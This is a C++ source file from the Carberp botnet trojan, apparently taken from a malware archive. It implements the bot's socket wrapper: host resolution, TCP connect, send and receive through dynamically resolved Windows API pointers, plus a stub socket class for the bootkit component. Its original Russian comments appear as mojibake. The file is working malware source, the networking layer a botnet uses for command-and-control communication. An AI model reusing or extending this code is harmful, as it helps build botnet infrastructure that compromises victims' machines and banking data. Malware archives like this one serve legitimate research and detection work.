/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#pragma hdrstop

#include <winsock2.h>
#include "Memory.h"
#include "BotSocket.h"


#include "BotDebug.h"
namespace SOCKETDBGTEMPLATES
{
	#include "DbgTemplates.h"
}

#define SOCKDBG SOCKETDBGTEMPLATES::DBGOutMessage<>


//---------------------------------------------------------------------------



//****************************************************************************
//  								TBotSocket
//****************************************************************************

TBotSocket::~TBotSocket()
{
}


//------------------------------------------------------
//  Connect - ������� ����� � ������������ � ����������
//			  �������
//  HostName - ��� �������
//  Port     - ���� � �������� ����� ������������
//------------------------------------------------------
bool TBotSocket::Connect(const char *HostName, WORD Port)
{
	return DoConnect(HostName, Port, 0);
}

//------------------------------------------------------
//  Connect - ������� ����� � ������������ � ����������
//			  �������
//  HostName - ��� �������
//  Port     - ���� � �������� ����� ������������
//  Timeout  - �������� ������� � ������� �������� �����
//             ������������� ������� �����������
//------------------------------------------------------
bool TBotSocket::Connect(const char *HostName, WORD Port, DWORD Timeout)
{
	return DoConnect(HostName, Port, Timeout);
}



//****************************************************************************
//  								TWinSocket
//****************************************************************************

TBotSocket* CreateSocket()
{
	return new TWinSocket();
}

bool InitWindowsSocketApi()
{
	// �������������� ����������
	WSADATA wsa;
	ClearStruct(wsa);
	DWORD Code = (DWORD)pWSAStartup(MAKEWORD( 2, 2 ), &wsa);
	return Code == 0;
}

TWinSocket::TWinSocket() : Socket(INVALID_SOCKET)
{
}

TWinSocket::~TWinSocket()
{
	// ��������� ��� ���� ������� � ���� �����������.
	Close();
}

void TWinSocket::Close()
{
	// ���� ����� �� ��� ������ - ������ �� ������.
	if (Socket == INVALID_SOCKET) return;

	pshutdown(Socket, SD_BOTH);
	pclosesocket(Socket);

	Socket = INVALID_SOCKET;
}

#define MAKEPORT(x) (((x) << 8) | ((x) >> 8))

bool TWinSocket::DoConnect(const char *HostName, WORD Port, DWORD Timeout)
{
	if (Timeout == 0) Timeout = 60 * 60;// 1 hour
	
	// ���� ����� �������� - ��������� ��������� ����������
	if (Socket != INVALID_SOCKET) return false;

	// �������������� ����������
	if (!InitWindowsSocketApi()) return false;

	LPHOSTENT lpHost = (LPHOSTENT)pgethostbyname(HostName);

	if (!lpHost)
		return false;

	// ��������� ����
	Socket = (SOCKET)psocket( AF_INET, SOCK_STREAM, 0 );

	if(Socket == SOCKET_ERROR)
		return false;

	struct sockaddr_in SockAddr;

	SockAddr.sin_family		 = AF_INET;
	SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
	SockAddr.sin_port		 = MAKEPORT((unsigned short)Port );

	// ������������ � ������
	if ( (int)pconnect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) == SOCKET_ERROR )
	{
		pclosesocket( Socket );
		Socket = INVALID_SOCKET;
	}

	return Socket != INVALID_SOCKET;

/*	do
	{
		// �������������� ����������
		if (!InitWindowsSocketApi()) break;

		// ��������  ����� �� ����� �����
		LPHOSTENT lpHost = (LPHOSTENT)pgethostbyname(HostName);

		// �� ����� ���
		if ( lpHost == NULL ) break;

		Socket = (SOCKET)psocket( AF_INET, SOCK_STREAM, IPPROTO_TCP);

		// ����� �� ��������
		if( Socket == INVALID_SOCKET ) break;

		// �������� ������������� �����
		u_long nonblocking_enabled = 1;
		int ioct_result = (int)pioctlsocket(Socket, FIONBIO, &nonblocking_enabled);

		// �� ���������� ������� ������������� �����
		if (ioct_result != NO_ERROR) break;

		struct sockaddr_in SockAddr;

		SockAddr.sin_family      = AF_INET;
		SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
		SockAddr.sin_port        = MAKEPORT((unsigned short)Port );

		// ������������ � �����
		int   connect_result = (int)pconnect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) );
		DWORD last_error = (DWORD)pWSAGetLastError();

		// �-��� ������� ���������� ������� � ������������� ������
		if (connect_result != SOCKET_ERROR) break;

		// ������ �� ������� � ������������� �������
		if (last_error !=  WSAEWOULDBLOCK) break;

		fd_set writefds;
		fd_set readfds;
		fd_set excptfds;

		TIMEVAL tv;

		tv.tv_sec  = Timeout;
		tv.tv_usec = 0;

		FD_ZERO(&writefds);
		FD_ZERO(&readfds);
		FD_ZERO(&excptfds);

		FD_SET(Socket, &writefds);
		FD_SET(Socket, &readfds);
		FD_SET(Socket, &excptfds);

		int select_result = (int)pselect(0, &readfds, &writefds, &excptfds, &tv);

		// ������ ��� ������ select
		if (select_result == SOCKET_ERROR) break;

		// ������ ��� ����������.
		if (pWSAFDIsSet(Socket, &excptfds) != 0) break;

		// ������ �� ����, �� � ����������� �� �����.
		if (pWSAFDIsSet(Socket, &writefds) == 0) break;

		// ��� ���������� ��� ����� �����������.
		// ��������� ������������� �����
		nonblocking_enabled = 0;
		ioct_result = (int)pioctlsocket(Socket, FIONBIO, &nonblocking_enabled);

		// �� ���������� ��������� ������������� �����
		if (ioct_result != NO_ERROR) break;

		return true;
	}
	while (0);

	Close();
	return false; */
}

int TWinSocket::Write(const void* Buf, DWORD BufSize)
{
	return (int)psend(Socket, (const char*)Buf, BufSize, 0);
}

int TWinSocket::Read(void* Buf, DWORD BufSize)
{
	return (int)precv(Socket, (char*)Buf, BufSize, 0);
}

//***************************************************************
//  TBkSocket - ����� ��� ������ � ������� ��������� Bootkit
//
//***************************************************************
TBotSocket* CreateBootkitSocket()
{
	return new TBkSocket();
}

bool TBkSocket::DoConnect(const char *HostName, WORD Port, DWORD Timeout)
{
	if (Timeout == 0) Timeout = 60 * 60;// 1 hour
	
	// ���� ����� �������� - ��������� ��������� ����������
	if (Socket != INVALID_SOCKET) return false;

	Close();
	return false;
}

TBkSocket::TBkSocket()
{
	Socket = INVALID_SOCKET;
}

TBkSocket::~TBkSocket()
{
	Close();
}

void TBkSocket::Close()
{
	// ���� ����� �� ��� ������ - ������ �� ������.
	if (Socket == INVALID_SOCKET) return;

	Socket = INVALID_SOCKET;
}

int TBkSocket::Write(const void* Buf, DWORD BufSize)
{
	return SOCKET_ERROR;
}

int TBkSocket::Read(void* Buf, DWORD BufSize)
{
	return SOCKET_ERROR;
}
